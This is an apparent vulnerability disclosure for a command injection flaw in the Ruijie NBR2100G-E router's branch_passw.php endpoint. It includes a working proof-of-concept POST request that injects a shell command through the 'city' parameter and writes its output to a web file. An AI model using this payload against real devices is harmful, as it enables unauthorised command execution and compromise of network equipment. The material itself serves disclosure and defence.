Ruijie Networks is a specialized network provider with a full range of network equipment and solutions, including switches, routers, software, security firewalls, wireless products, and storage devices.

The Ruijie NBR2100G-E router gateway product has a command execution vulnerability. Exploiting this vulnerability, attackers can gain server privileges, potentially compromising the server.

The vulnerability is located at: /itbox_pi/branch_passw.phpï¼ŒIn the listAction() method, the city parameter is controllable and directly embedded into `` for command execution, resulting in a command execution vulnerability.

By using the city parameter, commands can be executed directly. For example, the whoami command can be written into x.php. Then, by accessing /itbox_pi/x.php, the 'whoami' command will be executed.

poc:
POST /itbox_pi/branch_passw.php?a=list HTTP/1.1
Host: 127.0.0.1:10013
Cookie: user=admin; LOCAL_LANG_COOKIE=zh; RUIJIEID=8qcg546kfekl7e7nsugr8ckft4; user=admin; helpKey=home_sys
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 1.1.1.1
X-Originating-Ip: 1.1.1.1
X-Remote-Ip: 1.1.1.1
X-Remote-Addr: 1.1.1.1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

city=|echo `whoami`>x.php
